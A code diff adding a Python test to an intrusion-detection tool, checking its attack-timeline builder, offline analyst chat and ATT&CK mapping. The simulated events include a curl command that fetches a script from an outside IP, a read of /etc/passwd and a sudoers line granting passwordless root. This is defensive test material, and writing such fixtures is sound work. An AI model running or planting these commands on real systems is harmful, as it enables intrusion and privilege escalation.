@@ -388,6 +388,61 @@ def test_baseline():
     return ok
 
 
+def test_story():
+    """v1.3: 침입 이야기 · AI 분석관 대화(모델 없이) · ATT&CK 연결표"""
+    import json as _json
+    import os
+    import tempfile
+    from datetime import timedelta
+    import analyst
+    import story
+    import webui
+    from attack_taxonomy import ATTACK, RULE_INFO, attack_of
+    from storage import Storage
+    ok = True
+    ok &= all(r in ATTACK for r in RULE_INFO)
+    ok &= attack_of("critical_file_change", {"path": "/etc/sudoers"})["id"] == "T1548.003"
+    d = tempfile.mkdtemp()
+    db = Storage(os.path.join(d, "t.db"))
+    ip, base = "45.9.8.77", datetime.now() - timedelta(minutes=30)
+
+    def put(kind, data, dt):
+        db.conn.execute("INSERT INTO events(ts,host,kind,data,sim) VALUES(?,?,?,?,0)",
+                        ((base + timedelta(seconds=dt)).isoformat(timespec="seconds"), "h", kind, _json.dumps(data)))
+        db.conn.commit()
+    for i in range(6):
+        put("logon", {"type": "logon_fail", "user": "root", "src_ip": ip, "logon_type": "ssh"}, i * 5)
+    put("logon", {"type": "logon_success", "user": "deploy", "src_ip": ip, "logon_type": "ssh"}, 60)
+    for i, c in enumerate(["id", "cat /etc/passwd", "curl http://45.9.8.21/x.sh -o /tmp/x.sh"]):
+        put("process", {"pid": 900 + i, "ppid": 800, "name": c.split()[0], "parent": "bash", "cmdline": c,
+                        "username": "deploy", "ancestors": [{"name": "bash"}, {"name": "sshd"}]}, 90 + i * 7)
+    put("process", {"pid": 950, "ppid": 1, "name": "cron", "cmdline": "cron -f", "username": "root", "ancestors": []}, 100)
+    put("file", {"path": "/etc/sudoers", "change": "modified", "value": "deploy ALL=(ALL) NOPASSWD: ALL", "source": "integrity"}, 150)
+    put("network", {"kind": "outbound", "raddr_ip": "45.9.8.21", "raddr_port": 8443, "lport": 50001, "process": "bash",
+                    "pid": 902, "username": "deploy", "state": "ESTABLISHED"}, 160)
+    db.add_alert("h", "HIGH", "remote_rdp_logon", f"deploy@{ip}", {"src_ip": ip, "user": "deploy", "logon_type": "ssh"})
+    st = story.build(db, ip, describe=webui.describe)
+    kinds = [l["kind"] for l in st["lines"]]
+    ok &= st["intrusion"] and st["accounts"] == ["deploy"] and len(st["processes"]) == 3   # root 의 cron 은 안 섞임
+    ok &= "logon_fail" in kinds and "file" in kinds and "outbound" in kinds and "alert" in kinds
+    ok &= "T1021.001" in [a["id"] for a in st["attacks"]]
+    ok &= story.build(db, "10.9.9.9", describe=webui.describe)["lines"] == []
+
+    class M:
+        pass
+    mon = M()
+    mon.db, mon.cfg, mon.det, mon.host = db, CFG, None, "h"
+    r1 = analyst.ask(mon, f"{ip} 이 뭐 했어?", describe=webui.describe, use_llm=False)
+    r2 = analyst.ask(mon, "오늘 뭐 있었어?", describe=webui.describe, use_llm=False)
+    r3 = analyst.ask(mon, "sudoers 바뀐 적 있어?", describe=webui.describe, use_llm=False)
+    ok &= r1["ok"] and r1["ips"] == [ip] and "deploy" in r1["answer"] and "명령 3개" in r1["answer"]
+    ok &= r2["ok"] and r2["period"] == "오늘" and "remote_rdp_logon" in r2["answer"]
+    ok &= r3["ok"] and "sudoers" in r3["answer"]
+    print(f"\n[v1.3] 침입 이야기: {st['summary']}")
+    print(f"[v1.3] 대화(모델 없음): {r1['answer'].splitlines()[0][:90]}")
+    return bool(ok)
+
+
 def judge_check(det_rules):
     """시나리오 C 알림으로 'AI 공격 프로그램' 판정이 나오는지 (webui.judge_ai)"""
     import webui
@@ -416,6 +471,7 @@ if __name__ == "__main__":
     l_ = scenario_persist()
     m_ = scenario_persist_normal()
     judged = judge_check(c)
+    story_ok = test_story()
     expect = {"port_scan", "ioc_ip_match", "webserver_spawned_shell", "recon_burst"}
     expect_c = {"artex_user_agent", "distributed_ips", "agent_command_style", "retry_loop", "payload_staging",
                 "privilege_escalation", "credential_dump", "ioc_domain_query"}
@@ -456,7 +512,7 @@ if __name__ == "__main__":
     print(f"  내 AI 도구 사용 → 빨간 경보 {len(e_intr)}건 ({'OK' if not e_intr else '오탐: ' + ', '.join(e_intr)})"
           f" · 기록만: {', '.join(e) or '없음'}")
     print(f"  수집기 파서: {'OK' if parsers else 'FAIL'} · AI 판정: {'OK' if judged else 'FAIL'}"
-          f" · 평소 패턴 학습: {'OK' if base_ok else 'FAIL'}")
-    bad = miss + len(b) + len(e_intr) + (not parsers) + (not judged) + (not base_ok)
+          f" · 평소 패턴 학습: {'OK' if base_ok else 'FAIL'} · 침입 이야기·대화·ATT&CK: {'OK' if story_ok else 'FAIL'}")
+    bad = miss + len(b) + len(e_intr) + (not parsers) + (not judged) + (not base_ok) + (not story_ok)
     print(f"\n{'모두 통과' if not bad else f'실패 {bad}건'}")
     raise SystemExit(1 if bad else 0)
